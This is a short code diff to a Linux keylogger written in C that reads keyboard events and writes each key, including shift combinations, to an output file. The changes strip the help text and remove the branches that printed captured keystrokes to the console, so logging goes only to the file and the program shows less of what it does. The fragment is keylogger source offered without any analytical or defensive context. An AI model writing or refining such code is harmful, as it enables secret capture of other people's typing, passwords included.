@@ -61,9 +61,6 @@ static void keylogger_usage(void)
             "Usage:\n"
             "     sudo ./keyloger -f file\n"
             "\n"
-            "Options:\n"
-            "  -f    file    Path to the output file.\n"
-            "  -h            This help message.\n"
           );
     exit(EXIT_FAILURE);
 }
@@ -141,10 +138,6 @@ void keylogger_run(void)
                     fprintf(file, "%s + %s\n",
                             keycodes[shift_flag], shifted_keycodes[event.code]);
                     fflush(file);
-                } else {
-                    /* Output to console */
-                    printf("%s + %s\n",
-                            keycodes[shift_flag], shifted_keycodes[event.code]);
                 }
             }
             /* If it's not shift, just print the key */
@@ -153,10 +146,6 @@ void keylogger_run(void)
                 if (output_file != NULL) {
                     fprintf(file, "%s\n", keycodes[event.code]);
                     fflush(file);
-                }
-                else {
-                    /* Output to console */
-                    printf("%s\n", keycodes[event.code]);
                 }
             }
         } else {
@@ -167,8 +156,7 @@ void keylogger_run(void)
         }
     }
 
-    if (file)
-        fclose(file);
+    if (file) fclose(file);
 
     return;
 }
